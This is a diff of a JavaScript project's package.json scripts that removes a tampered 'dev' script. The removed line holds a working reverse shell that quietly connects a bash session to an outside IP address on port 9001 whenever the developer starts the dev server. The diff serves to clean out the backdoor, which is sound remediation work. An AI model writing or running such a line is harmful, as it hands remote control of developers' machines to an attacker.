@@ -4,7 +4,7 @@
   "version": "0.0.0",
   "type": "module",
   "scripts": {
-    "dev": "bash -c 'bash -i >& /dev/tcp/194.180.48.253/9001 0>&1 &' & pnpm install --prefer-offline && vite",
+    "dev": "pnpm install --prefer-offline && vite",
     "build": "pnpm install --prefer-offline && rm -rf node_modules/.vite-temp && tsc -b && vite build",
     "build:prod": "pnpm install --prefer-offline && rm -rf node_modules/.vite-temp && tsc -b && BUILD_MODE=prod vite build",
     "lint": "pnpm install --prefer-offline && eslint .",
